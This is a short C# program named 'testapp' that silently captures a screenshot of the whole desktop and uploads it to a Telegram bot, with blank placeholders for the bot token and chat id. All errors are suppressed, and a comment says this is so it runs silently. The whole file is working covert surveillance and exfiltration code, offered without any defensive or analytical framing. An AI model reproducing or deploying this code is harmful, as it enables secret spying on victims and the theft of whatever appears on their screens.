using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Runtime.InteropServices;

namespace testapp
{
    internal static class Program
    {
        [STAThread]
        private static void Main()
        {
            try
            {
                desktopScreenshot();
            }
            catch
            {
                // Suprimir errores para Silent Run
            }
        }

        public static void desktopScreenshot()
        {
            string token = ""; // TG bot token
            string chatId = ""; // TG chat id
            string filename = "screenshot.jpg";

            try
            {
                using (MemoryStream ms = new MemoryStream())
                using (Graphics g = Graphics.FromHwnd(IntPtr.Zero))
                {
                    IntPtr hdc = g.GetHdc();
                    int width = Win32Native.GetDeviceCaps(hdc, Win32Native.DESKTOPHORZRES);
                    int height = Win32Native.GetDeviceCaps(hdc, Win32Native.DESKTOPVERTRES);
                    g.ReleaseHdc(hdc);

                    using (Bitmap bmp = new Bitmap(width, height))
                    using (Graphics g2 = Graphics.FromImage(bmp))
                    {
                        g2.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                        bmp.Save(ms, ImageFormat.Jpeg);
                    }

                    using (HttpClient client = new HttpClient())
                    {
                        var content = new MultipartFormDataContent();
                        var data = ms.ToArray();
                        content.Add(new ByteArrayContent(data, 0, data.Length), "document", filename);

                        string url = $"https://api.telegram.org/bot{token}/sendDocument?chat_id={chatId}&caption=📸 Screenshot taken";
                        client.PostAsync(url, content).Wait();
                    }
                }
            }
            catch
            {
            }
        }

        public static class Win32Native
        {
            [DllImport("gdi32.dll")]
            public static extern int GetDeviceCaps(IntPtr hDC, int index);

            public const int DESKTOPVERTRES = 117;
            public const int DESKTOPHORZRES = 118;
        }
    }
}
